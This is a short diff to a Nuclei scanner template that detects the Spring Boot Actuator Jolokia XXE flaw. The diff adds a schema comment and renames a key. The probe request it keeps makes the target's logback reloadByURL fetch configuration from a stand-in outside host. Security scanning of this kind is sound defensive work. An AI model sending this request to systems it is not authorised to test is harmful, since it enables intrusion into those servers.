@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: springboot-actuators-jolokia-xxe
 info:
   name: Spring Boot Actuators (Jolokia) XXE
@@ -8,7 +9,7 @@ info:
     - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
     - https://github.com/mpgn/Spring-Boot-Actuator-Exploit
   tags: springboot,jolokia,xxe
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml"
